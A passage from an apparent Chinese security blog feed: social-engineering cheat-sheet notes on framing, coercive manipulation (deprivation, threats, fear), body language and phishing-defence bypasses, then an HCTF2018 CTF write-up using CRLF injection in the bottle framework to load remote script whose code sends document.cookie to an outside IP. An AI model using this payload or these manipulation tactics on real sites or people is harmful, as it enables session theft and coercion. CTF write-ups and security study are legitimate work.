必须要与个人的核心信仰保持一致        * 框架与参与者现实情况的关联            框架必须与目标本人相关，如目标经历的关系必须可信并且可验证        * 对当前社会变迁的持续关注，以及框架在当前时代出现的时间点    * 框架桥接（联系）        就某一主题而言，思想上一致，但结构上互不关联的两个框架的连接        在深入了解目标的框架后，发现两者之间的联系，利用这一联系将目标带入你的框架——伪装    * 框架放大        对一个与某议题、问题或者一组事件有关的解释性框架进行阐述及激励——扩大或把焦点放在目标的价值观或信仰上        涉及强调某一事件比其他事件更重要，从而使这个时间能够轻松与其他事件联系起来        可以成功的让现有框架产生混乱，使具有特定信仰的人远离他们的信仰    * 框架扩展        是一种变动的成果，通过将提议的框架边界扩展到一群人的观点、兴趣，特别是情绪，将参与者引入其中        通过扩展框架的边界，将目标的其他主题或兴趣引入其中，与他们达成联盟（一致）        太多的扩展可能会削弱人们对原有框架的支持，导致其在一定程度上丧失吸引力    * 框架转换        当提议的框架很难引起共鸣，而且有时与传统的生活方式、礼制衣机现有的解释框架背道而驰的时候，就需要对框架进行转换        通过提出新的论点说明为什么新的框架更好，意图将目标原有的框架思维和信念转换为新的样子        需要新的价值观和理念来确保人们参与其中，并得到他们的支持（时间 / 精力 / 教育 / 逻辑 / 深厚的感情纽带）* 利用框架战术    * 说的每件事都会唤起一个框架        利用语言进行描绘，使目标大脑中描绘出对应的事物    * 框架中定义的词句会唤起思维框架        不必使用确切的字词为他人庙会设想的框架        通过间接表达控制对象的思维（事先计划）    * 否定框架        告诉目标要小心、当心或提防某事，会自动将其引入设想的框架中    * 让目标思考框架会强化框架        每次大脑在关注或考虑某事的时候，该事件会得到强化        通过省略某些细节，仅透露出想要透露的细节，可以创建出他们想要目标思考或感觉的框架        贴标签：通过描述性词句为某事打上标签，将目标带入设定的框架    适当改变呈现、设定道德选择和价值困境的方式，会对人们的政治选择和政策产生深远的影响</code></pre><hr><h2 id="操纵"><a href="# 操纵" class="headerlink" title="操纵"></a>操纵</h2><blockquote><p>通过自身的技巧控制或影响他人，达到自己的目的</p></blockquote><h3 id="目的"><a href="# 目的" class="headerlink" title="目的"></a>目的 </h3><p> 战胜目标的批判性思维</p><h3 id="手段"><a href="# 手段" class="headerlink" title="手段"></a>手段</h3><ol><li><p>自动应答。大脑在接收到问题后会自动作出应答</p></li><li><p>条件反射。通过不断的适应，人们会将特定的声音、行为与感觉和情绪相关联</p></li><li><p>转移。将人们的注意力从他们的事实行为上转移，改变目标的关注焦点</p></li><li><p>问题构造。首先构造一个可怕的问题，然后提供“事实”作为证据，证明问题与解决方案的真实性</p></li><li><p>色彩。操纵目标的情绪</p><table><thead><tr><th>颜色</th><th>含义</th></tr></thead><tbody><tr><td>白色</td><td>纯洁 / 明亮 / 干净 / 安全 / 中立 / 善良 / 忠诚</td></tr><tr><td>黑色</td><td>权利 / 高雅 / 神秘 / 力量 / 权威 / 深度 / 稳定 / 平静 / 宁静 / 强化其他色彩</td></tr><tr><td>红色</td><td>喜悦 / 兴奋 / 喜庆 / 行动 / 能量 / 健康 / 速度 / 激情 / 欲望 / 爱 / 刺激情绪 / 心跳呼吸加快 / 血压升高 / 力量 / 冲动 / 武力 / 威胁 / 征服 / 暴力 / 复仇</td></tr><tr><td>橙色</td><td>温暖 / 热情 / 吸引 / 决心 / 力量 / 忍耐 / 鼓舞 / 活力 / 刺激食欲 / 不安全 / 无知 / 迟缓</td></tr><tr><td>金色</td><td>明亮 / 智慧 / 财富 / 威望</td></tr><tr><td>黄色</td><td>能量 / 乐观 / 喜悦 / 高兴 / 忠诚 / 精神饱满 / 让对方觉得成为焦点和受重视 / 少量应用会激发正面情绪，过多会让目标注意力不集中</td></tr><tr><td>绿色</td><td>大自然 / 和谐 / 生命 / 丰饶 / 雄心 / 保护 / 和平 / 平静 / 安全 / 过多会有贪婪 / 内疚 / 嫉妒 / 混乱</td></tr><tr><td>蓝色</td><td>天空 / 海洋 / 智慧 / 直觉 / 真理 / 宁静 / 健康 / 力量 / 知识 / 镇定 / 冷静 / 使新陈代谢变慢 / 眼睛最容易适应 / 寒冷 / 忧郁 / 沮丧</td></tr><tr><td>紫色</td><td>皇家 / 高贵 / 奢侈 / 创意 / 神秘</td></tr><tr><td>棕色</td><td>地球 / 可靠 / 易接近 / 惯例 / 秩序 / 牢固 / 相关 / 秩序感</td></tr></tbody></table></li><li><p>激励。刺激人们去采取行动的东西</p><ul><li>金钱激励。例如买彩票和优惠券等</li><li>意识激励。人们会被拥有类似梦想和目标的人吸引，具有类似信息的人能够增强彼此的信念和做正确的事的欲望。例如寓言故事和共鸣等</li><li>社会激励。人们对生活和自身的看法，会受周围人群极大影响。例如尾随战术——混入羊群</li></ul></li></ol><h3 id="操纵方法"><a href="# 操纵方法" class="headerlink" title="操纵方法"></a>操纵方法</h3><ol><li>提高目标的暗示感受性<ul><li>极端：睡眠和食物匮乏</li><li>缓和：时间紧迫 <br> 用恐惧、愤怒或激动等情绪扰乱目标后，可以为他植入不同的信念，这些情绪会导致目标暗示接受性提高和判断力下降。首先给目标一个会另其感到恐惧或激动的暗示，然后提供一个解决方案（植入信念），制造出一个易于接受暗示的环境</li></ul></li><li>控制目标的环境。通常用于在线社会工程、欺诈和身份盗用等，控制目标能访问的信息类型和数量。例如获取目标社交网站的访问权</li><li>迫使目标重新评估（制造怀疑）。动摇并深挖目标的信仰系统，逐渐削弱目标的信念、意识或对某一情况的情绪控制会让目标感到不安</li><li>让目标感到无能为力（感觉脆弱）。利用权威，让目标对自己的信念逐步丧失信心</li><li>给予非肉体惩罚（让目标产生强烈的情绪反应）。焦虑、怀疑、罪恶感、耻辱等，让目标丧失特权</li><li>威胁目标。对生理痛苦或其他可怕情形的畏惧让目标在压力下崩溃，利用权威制造强烈的恐惧感或有潜在损失的感觉，让目标感到不自在，忧虑</li></ol><h3 id="操纵技巧"><a href="# 操纵技巧" class="headerlink" title="操纵技巧"></a>操纵技巧</h3><ol><li>不要让目标的表现影响你的情绪，控制情绪，保持冷静</li><li>寻找积极的话题，适当，有涵养，有品位</li><li>假定，假定一切——信心，保持信念</li><li>尝试不同的开头</li><li>使用过去时，将过去负面状态和行为放到回忆中，使人有“重新开始”的感觉</li><li>探讨并摧毁，实现思考如何处理潜在的交流障碍或破坏性影响</li></ol><h1 id="非语言交流"><a href="# 非语言交流" class="headerlink" title="非语言交流"></a>非语言交流 </h1><h2 id="身势学 -——- 肢体语言"><a href="# 身势学 -——- 肢体语言" class="headerlink" title="身势学 —— 肢体语言"></a> 身势学 —— 肢体语言</h2><blockquote><p>对非语言身体动作与交流之间的关系的系统研究</p></blockquote><h3 id="手部语言"><a href="# 手部语言" class="headerlink" title="手部语言"></a>手部语言 </h3><p> 起源：神经系统、生存本能、随文化 / 阶级 / 家庭或个人变化</p><p>编码：</p><ul><li>固有编码</li><li>形象编码</li><li>行为和含义间的关系——象征</li></ul><p>分类：</p><ol><li>象征性动作。<ul><li>包含了一个或两个词的简单短语的直接传译</li><li>一个为团体、阶级或亚文化群所熟知的准确含义</li><li>经常有意的用来向他人传递特定消息</li><li>接收者知道其接收的象征动作是有意为之</li><li>发送者对交流负责任</li></ul></li><li>演示性动作<ul><li>那些与演讲、措辞、内容、声调变化曲线及响度等实时密切相关的行为</li><li>强化所说的话的动作姿态，通常没有准确的语言含义</li><li>一般不会在没有对话时使用，只有和说话者使用，收听者不会使用</li><li>演示性动作随说话的增加、愤怒、恐惧、焦虑、兴奋而增加</li><li>感情投资、厌倦、假装关切、不善说谎的人会停止使用演示性动作</li></ul></li><li>发令动作。强调某个特殊的词、短语</li><li>表意动作。速写思路</li><li>指示动作，指向物品、地点或时间</li><li>节律动作，描述事件进行的步调</li><li>空间动作，描述空间关系</li><li>活动动作，描述身体运动或非人类肢体运动</li><li>象形动作，描述涉及的物体</li><li>象征动作，阐明某事或代替一句话 / 短语</li><li>操纵性动作，涉及对身体部位或衣着进行整饰的行为<ul><li>紧张 -&gt; 搓手</li><li>寻求抚慰 -&gt; 玩弄首饰、扣子或其他衣着物品</li><li>玩弄头发、手或戒指等</li></ul></li><li>高度自信<ul><li>手心向上，手指伸展有助于建立密切关系，增强积极情感</li><li>尖塔形手势</li><li>双手背到脑后，手臂伸展开（领地意识）</li><li>拇指动作：向上露出拇指</li><li>腹部动作（下腹部）-&gt; 开放性动作</li><li>双手张开露出腹部：邀请</li><li>双手并拢，至于腹部：命令 / 要求</li><li>向内曲拢手指：命令、指挥</li><li>挽起袖子</li><li>女生双手叉腰</li><li>生殖器指向：自信、支配欲</li><li>勾起拇指放在腰带上或裤兜里</li></ul></li><li>不自信<ul><li>揉搓双手：紧张、不适</li><li>不停叩响指关节</li><li>用手抓、揉或对衣着及身体部位进行操纵性动作</li><li>拇指向下</li><li>藏起或放低拇指</li><li>手部闭合</li><li>隐藏、放低双手</li></ul></li></ol><h3 id="腿、脚部语言"><a href="# 腿、脚部语言" class="headerlink" title="腿、脚部语言"></a>腿、脚部语言</h3><ul><li>对抗地心引力的动作姿态（弹跳、摇摆、抬起脚尖）：开心</li><li>脚、腿部的朝向：指向想去的地方</li><li>扩大双脚站立的距离：感受到威胁（领地意识）</li><li>跷二郎腿：朝向喜欢的人 / 不朝向喜欢的人（设置屏障）</li></ul><h3 id="躯干和身体语言"><a href="# 躯干和身体语言" class="headerlink" title="躯干和身体语言"></a>躯干和身体语言</h3><ol><li>躯干倾斜。人们的躯干无意识会倾斜于他们喜欢的事物，远离他们不喜欢的事物</li><li>胸部的起伏。胸部的起伏和粗重的呼吸：为吸入更多氧气（不适）</li><li>手臂<ul><li>开放的双臂（腹部）、手臂前端或敏感部位暴露：信任</li><li>封闭（交叉）：设置屏障（高于胃部，低于胸部，防御姿态）</li></ul></li><li>腹部。开放的腹部表示自信、信任</li><li>肩部。耸肩：不确定、不适、不知道，表疑问或否定</li></ol><h3 id="舒适与不适（操纵性动作）"><a href="# 舒适与不适（操纵性动作）" class="headerlink" title="舒适与不适（操纵性动作）"></a>舒适与不适（操纵性动作）</h3><blockquote><p>融入群体：自己和周围的人群表相处相同的情绪，寻找或制造一种利用重大事件加入群体的情况</p></blockquote><ol><li>颈部。当人们在做艰难的决定时，揉搓或抚摸流经颈部（后颈部）和胸上部（胸骨切迹）的两条神经（交感神经和颈动脉窦）能起到安抚作用：紧张、怀疑、害怕、担忧、威胁</li><li>脸部。揉搓脸部：威胁、不安全、不适、怀疑</li><li>嘴部。捂嘴：害怕、惊讶、恐惧、震惊、悲伤（自我安慰）</li><li>唇部<ul><li>双唇紧闭：压抑愤怒，阻止想说的话</li><li>双唇撅起：不确定，认知负荷（一般会伴随眉头紧锁），犹豫不决</li><li>咬唇（咬手指，嚼东西）：认知负荷，焦虑</li></ul></li><li>眼部。罩住眼睛：情绪激动（悲伤、愤怒），阻止视觉刺激</li><li>头部。倾斜头部：开放，信任（伴随微笑）</li><li>胸部。双臂交叉环胸：自我安慰（紧张）</li></ol><h3 id="RSVP"><a href="#RSVP" class="headerlink" title="RSVP"></a>RSVP</h3><ol><li>节奏 Rhythm/ 语速 Speed/ 音量 Volume/ 音高 Pitch</li><li>代词的变化（语言风格）</li><li>口吃和用词重复的增加（语言风格）——忧虑、压力</li><li>声调的变化——情绪</li><li>不做正面答复</li><li>停顿——认知负荷，通常伴随眼部动作</li></ol><h2 id="人际距离学"><a href="# 人际距离学" class="headerlink" title="人际距离学"></a>人际距离学</h2><blockquote><p>对周围空间的使用方式</p></blockquote><ol><li>公共空间。说话，听众，4～8 米</li><li>社交空间。适用于社交场合，1.2～3 米</li><li>私人空间。同家人或朋友互动，0.6～1.2 米</li><li>亲密空间。可以亲密接触的人，小于 0.3 米</li></ol><h2 id="触摸"><a href="# 触摸" class="headerlink" title="触摸"></a>触摸 </h2><p> 在交流过程中传递情感，并建立信任感（建立和谐的氛围）</p><h2 id="眼神交流"><a href="# 眼神交流" class="headerlink" title="眼神交流"></a>眼神交流 </h2><p> 观察他人的情绪状态</p><h2 id="嗅觉学"><a href="# 嗅觉学" class="headerlink" title="嗅觉学"></a>嗅觉学 </h2><p> 触发人们对人，事，物的回忆和情感</p><h2 id="着装"><a href="# 着装" class="headerlink" title="着装"></a>着装 </h2><p> 着装认知：服装的象征意义和身体穿着体验的共存</p><h2 id="面部表情"><a href="# 面部表情" class="headerlink" title="面部表情"></a>面部表情</h2><ol><li>宏表情：2～4 秒，有意识，可控</li><li>微表情：0.04～0.2 秒，无意识，不可控</li></ol><blockquote><p>注意：不要将自己的情绪加入到观察的情绪中</p></blockquote><h2 id="热点（Hotspot）"><a href="# 热点（Hotspot）" class="headerlink" title="热点（Hotspot）"></a>热点（Hotspot）</h2><p>与言行不一致的微表情或其他表现。当发现热点的时候，开始寻找出现热点的原因，不要只关注一种可能性，通过“对立假设”思考热点出现的原因，增加客观性</p><ol><li>做一个积极的聆听者和观察者，不要只关注一件事（面部、肢体语言、嗓音、声线、声音内容）</li><li>不要急于作出判断，充分利用所有可利用的时间、语言、非语言线索</li><li>注意所有出现的热点，但是在跟进、挑战或对峙时要有选择的利用热点</li><li>不要假定目标为什么会出现那种情绪，而是通过问题、基准太和访问策略深入研究情绪的成因</li></ol><h2 id="情绪"><a href="# 情绪" class="headerlink" title="情绪"></a>情绪 </h2><p> 一种受人们自己的过去影响的过程和特定的自我评价，大脑基于之前的经历和生物活动而形成的一组心里原则，用来处理当前所遇到的任何情况。七种基本情绪：恐惧，惊讶，悲伤，轻视，厌恶，愤怒，开心</p><h3 id="恐惧"><a href="# 恐惧" class="headerlink" title="恐惧"></a>恐惧 </h3><p> 恐惧经常被用来诱导目标至特定的反应和动作，也可以将恐惧重定向到其他情绪</p><p>特征：瞪大双眼，挑起眉毛，嘴唇同时向耳朵拉起，上眼皮抬起，露出虹膜上方的眼白</p><p>练习：</p><ol><li>尽量抬高上眼睑，同时尽量收紧下眼睑</li><li>水平咧开嘴巴，嘴唇水平伸展</li><li>在收紧上眼睑的时候抬高眼眉，露出虹膜上方的眼白，头向后仰</li></ol><p>或战或逃：因为紧张而倒吸一口气或尖叫，头和身体也向后退，远离害怕的东西</p><h3 id="惊讶"><a href="# 惊讶" class="headerlink" title="惊讶"></a>惊讶 </h3><p> 眼睛比恐惧时更放松，眼眉的拱形和扬起的程度更大，嘴唇垂直拉起而不是水平</p><p>特征：眉毛上扬，下颚张开，双眼睁大，</p><p>练习：</p><ol><li>在扬起眉毛的同时尽量睁大眼睛</li><li>下巴微微分开</li></ol><p>通路情绪：使人们先退到一边，意识到安全后再走近让人们意外的东西，身体也会倾向于那个带来惊讶的物品 -&gt; 开心，微笑</p><h3 id="悲伤"><a href="# 悲伤" class="headerlink" title="悲伤"></a>悲伤 </h3><p> 可能会使用虚假的微笑或坚韧的眼神隐藏悲伤，凝视正前方，面容呆滞。</p><ul><li>在极度悲伤时嘴巴会张开的更大</li><li>营造悲伤的气氛，激发人们采取某些行动——利用同情心</li></ul><p>特征：最佳下列，上眼睑下垂，外嘴角下斜，眉毛内侧上扬，眉头抬起向中间聚拢，双目低垂，嘴角下垂，下唇中心向外突出</p><p>练习：</p><ol><li>嘴角下拉（嘴巴张开或不张开）</li><li>上抬脸颊</li><li>上眼睑下垂，向下看</li><li>头部向下，前颚紧绷</li><li>眼眉内角皱在一起</li></ol><h3 id="轻视"><a href="# 轻视" class="headerlink" title="轻视"></a>轻视 </h3><p> 对那些在道义或社交上逊于自己的个人或群体的情感反应</p><ul><li>将轻视的对象排挤出自己的社交团体或阶层</li><li>通常会伴随愤怒</li><li>当嘴和脸颊的一侧抬起后，往往会产生假笑，点头或仰起头，表现自大</li></ul><p>特征：皱起的鼻子，上启的嘴唇，通常只出现在脸的一侧，眼部不对称，一侧脸颊上抬，嘴部不对称，下巴上抬</p><p>练习：</p><ol><li>扬起一侧的脸，仿佛脸颊挤压导致眯眼</li><li>扬起下巴，为了俯视轻蔑对象</li><li>颊肌抬起，脸部同侧的唇角会产生不对称上扬</li></ol><h3 id="厌恶"><a href="# 厌恶" class="headerlink" title="厌恶"></a>厌恶 </h3><p> 通常伴随愤怒、不满、不安与急躁</p><p>特征：上唇上启，漏出牙齿，鼻子皱成一团，双颊上移</p><p>练习：</p><ol><li>皱鼻（鼻梁）</li><li>嘴唇卷起来，有时也会张开并露出牙齿（上牙）</li><li>脸颊出现大幅褶皱</li><li>眉头紧锁</li></ol><h3 id="愤怒"><a href="# 愤怒" class="headerlink" title="愤怒"></a>愤怒 </h3><p> 愤怒时无法清晰思考（杏仁核劫持）</p><p>特征：紧抿双唇，眉头紧锁，双眼圆瞪 <br> 练习：</p><ol><li>拉低眉毛（有时会皱起来）</li><li>尝试瞪眼</li><li>紧紧挤压嘴唇，咬紧牙齿，收紧下颚</li><li>下巴通常收紧以保护颈部</li><li>呼吸粗重，变得紧张，心跳加快</li></ol><h3 id="开心"><a href="# 开心" class="headerlink" title="开心"></a>开心</h3><ol><li>真诚的微笑（易传染）：颧骨和眼轮匝肌的肌肉分别带动嘴角和脸颊肌肉提起，形成鱼尾纹</li><li>礼貌的微笑（社交微笑）：眼睛没有明显变化</li></ol><p>练习：</p><ol><li>扬起嘴角，抬高脸颊，嘴唇上啦</li><li>不眯眼睛，提高脸颊，将下眼睑上推，形成鱼尾纹</li></ol><h3 id="利用"><a href="# 利用" class="headerlink" title="利用"></a>利用</h3><ol><li>情景诱导。通过情绪上的微妙暗示操纵他人达到特定的情绪状态</li><li>识别欺骗<ul><li>矛盾：发现矛盾 -&gt; 继续挖掘更多信息 -&gt; 询问矛盾点 -&gt; 观察微表情</li><li>犹豫：通过犹豫（或者重复问题）来拖延时间以编造谎言</li><li>行为变化：每次谈到特定的话题可能导致某一特定行为的变化</li><li>手势：手势幅度、频率、时长的变化</li></ul></li></ol><h1 id="网络钓鱼"><a href="# 网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><blockquote><p>以对收件人施加影响或获得个人信息为目的，发送者看似来自权威来源的电子邮件</p></blockquote><h2 id="目标"><a href="# 目标" class="headerlink" title="目标"></a>目标</h2><ol><li>钱</li><li>信息</li><li>政治目的 / 个人信仰</li></ol><h2 id="手段 -1"><a href="# 手段 -1" class="headerlink" title="手段"></a>手段</h2><ol><li>邮件钓鱼</li><li>网站克隆</li><li>电话钓鱼（增加邮件的真实性 / 直接索取信息）</li></ol><h2 id="主题"><a href="# 主题" class="headerlink" title="主题"></a>主题</h2><ol><li>尼日利亚 419 骗局（预付款骗局）</li><li>金融类<ul><li>账户有异常登录请求</li><li>银行升级在线安全措施</li><li>未按时还款或纳税</li></ul></li><li>社交媒体</li><li>利用公共事件（杏仁核劫持）。贪婪、恐惧、敬畏权威、渴望交流、好奇、同情</li></ol><h2 id="检测特征"><a href="# 检测特征" class="headerlink" title="检测特征"></a>检测特征</h2><ol><li>含糊的称呼 / 签名</li><li>未知的 / 令人怀疑的网址链接</li><li>未知的 / 令人怀疑的发送者</li><li>错别字以及语法，拼写和标点符号错误</li><li>不合情理的借口</li></ol><h2 id="钓鱼攻击分类"><a href="# 钓鱼攻击分类" class="headerlink" title="钓鱼攻击分类"></a>钓鱼攻击分类</h2><ol><li>一级钓鱼攻击<ul><li>非指向性问候和结束语</li><li>拼写错误和糟糕的语法</li><li>简易的信息 / 不太可能成立的理由</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址 / 未知的发件人</li></ul></li><li>二级钓鱼攻击<ul><li>非指向性问候和结束语</li><li>拼写正确但是有一些语法问题</li><li>信息更加复杂但仍然很基本</li><li>引起贪婪、恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>奇怪的邮件地址 / 未知的发件人</li></ul></li><li>三级钓鱼攻击<ul><li>指向性问候和结束语</li><li>正确的拼写和不错的语法</li><li>复杂的信息，会引起恐惧或好奇的心理</li><li>文本中出现恶意链接</li><li>有时候会出现奇怪的邮件地址，但是发件人合法</li><li>很多时候会出现商标</li></ul></li><li>四级钓鱼攻击<ul><li>鱼叉式钓鱼攻击：针对特定目标进行个人定制</li><li>OSINT：Open-source intelligence（获取开放性情报）</li></ul></li></ol><h2 id="心理学原理"><a href="# 心理学原理" class="headerlink" title="心理学原理"></a>心理学原理 </h2><p> 决策：</p><ol><li>决策的好坏并不总是与我们对这个决策本身是否感到满意有关</li><li>决策包含了一系列因素，例如我们的看法和情绪</li><li>我们每天都在作出或大或小的决策，即使在并不具备所需要的全部相关信息下</li><li>我们不假思索的，频繁的作出这些或大或小的决策</li></ol><p>影响因素：</p><ol><li>认知偏差：通常源于过去的经验<ul><li>框架效应，反应依赖语境</li><li>可用性启发法，依赖于我们容易想起的事物</li><li>确认偏误，倾向于寻找支持自己观点的信息—偏执</li></ul></li><li>生理状态：饥饿、困倦、疲劳等负面的身体状态</li><li>外部因素：环境、形势的不确定性</li></ol><p>基础决策模型：</p><ol><li>定义问题（正确理解问题）</li><li>收集信息</li><li>权衡选择</li><li>作出决策</li><li>评估结果</li></ol><p>情绪化决策（杏仁核劫持）：</p><ol><li>基于情绪的钓鱼攻击</li><li>引起大脑和身体反应</li><li>情绪战胜逻辑</li><li>缺乏理性导致错误决策</li><li>产生情绪化行为</li></ol><blockquote><p>影响与操控：决策的催化剂</p></blockquote><h2 id="保护与绕过"><a href="# 保护与绕过" class="headerlink" title="保护与绕过"></a>保护与绕过</h2><ol><li><p>批判性思维</p><ul><li>告诉自己不要事都信以为真</li><li>绕过：利用情绪阻止批判性思维 -&gt; 杏仁核劫持</li></ul></li><li><p>悬停</p><ul><li>把鼠标悬停在连接上</li><li>绕过：购买看似合法的域名</li></ul></li><li><p>URL 解析</p><ul><li>绕过：购买看似合法的域名</li></ul></li><li><p>分析邮件头</p><ul><li><p>绕过：对网络进行渗透，获取 SMTP 服务器</p><table><thead><tr><th>邮件头</th><th>解释</th></tr></thead><tbody><tr><td>To</td><td>发送至</td></tr><tr><td>Reply-To</td><td>回复至</td></tr><tr><td>Delivered-To</td><td>已发送至</td></tr><tr><td>X-Received</td><td>邮件来源</td></tr><tr><td>Return-Path</td><td>返回路径</td></tr><tr><td>Received-Spf</td><td>发件人 SPF</td></tr><tr><td>Authentication-Results</td><td>身份认证结果</td></tr><tr><td>Dkim-Signature</td><td>DKIM 签名</td></tr><tr><td>Domainkey-Signature</td><td>域名密钥签名</td></tr><tr><td>Message-Id</td><td>信息编号</td></tr><tr><td>List-Unsubscribe</td><td>退订信息</td></tr><tr><td>Mime-Version</td><td>MIME 版本</td></tr><tr><td>Content-Type</td><td>内容类型</td></tr></tbody></table></li></ul></li><li><p>沙盒: 创建一个可以运行未经检测或不受信任的代码的环境</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SocialEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对某三流安全公司的渗透</title>
      <link href="/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/"/>
      <url>/2019/01/27/%E9%92%88%E5%AF%B9%E6%9F%90%E4%B8%89%E6%B5%81%E5%AE%89%E5%85%A8%E5%85%AC%E5%8F%B8%E7%9A%84%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="Wrong password hash!">  <script id="hbeData" type="hbeData" data-hmacdigest="4b29b26601c0ab0ed153ac9097a486d6172ced00db385f9d034d588ca649b5b4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Enter password here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SocialEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF2018 Bottle Writeup</title>
      <link href="/2018/11/12/HCTF2018-Bottle-Writeup/"/>
      <url>/2018/11/12/HCTF2018-Bottle-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not hard, I believe you are the lucky one!</span><br><span class="line">hint1: */3 */10 </span><br><span class="line">hint2: bot use firefoxDriver</span><br><span class="line">URL http://bottle.2018.hctf.io</span><br></pre></td></tr></table></figure><p> 后端是个 python，根据题目可知这个应用使用了 bottle 框架开发。应用功能是提交一个网址，但是经过测试发现不管提交什么网址都没有任何反应，目测可能只能提交本域名下的网址。</p><p> 登录与注册的时候发现中间经过了一个 path 跳转 </p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/4V@3FC@51J0E9XXG-1024x269.png"></p><p>bottle 框架比较出名一点的漏洞是 HTTP 头注入漏洞 (CVE-2016-9964)</p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112190926-1024x547.png"></p><p> 在 path 跳转时可进行 CRLF 注入 </p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112191129-1024x280.png"></p><p> 所以思路是利用 CRLF 注入，将 XSS 内容写入到 body 中，将这个网址提交给管理员，管理员访问这个网址，触发 XSS 达到 cookie</p><p> 这里有一个问题: 当浏览器发现 Location 可以跳转时，将不会对 body 中的 HTML 进行渲染而直接跳转，只有 Location 为空时才不会跳转。但是此题中 Location 又不能为空 (会 500)，因此当管理员访问这个网址时肯定会跳转。不过 Hint 中提到”bot use firefoxDriver”，而在 FireFox 中，当 Location 目标网址的端口小于 80 时不会对 Location 跳转，因此构造网址 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript%3Ea=1%3C/script%3E</span><br></pre></td></tr></table></figure><p> 注意到题目中还设置了 CSP<code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code>，后来出题人再修复此题之后将 CSP 放在了 CRLF 注入点的下面，这样就可以直接把 CSP 挤到 body 中，浏览器便不会解析 CSP。在本地 FireFox 中测试：</p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/U5Z7A0TGDGISN5ZXKH_J.png"></p><p> 这里不使用 alert 测试是因为当 URL 中存在引号或括号时会 500，于是将 script 的 src 指向自己服务器的 js 文件即可任意 XSS，最终 payload 如下 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:0/%0A%0D%0A%0D%3Cscript+src=http://srpopty.cn/1.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure><p>1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ajax=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">ajax.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://123.206.86.208/xss/&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>,<span class="literal">true</span>);</span><br><span class="line">ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">ajax.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure><p> 拿到管理员的 cookie</p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193243.png"></p><p> 修改 cookie 登录拿到 flag</p><p><img src="/2018/11/12/HCTF2018-Bottle-Writeup/TIM%E6%88%AA%E5%9B%BE20181112193331-1024x384.png"></p><hr><h2 id="参考"><a href="# 参考" class="headerlink" title="参考"></a> 参考 </h2><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccon2018 GhostKingdom Writeup</title>
      <link href="/2018/10/28/Seccon2018-GhostKingdom-Writeup/"/>
      <url>/2018/10/28/Seccon2018-GhostKingdom-Writeup/</url>
      
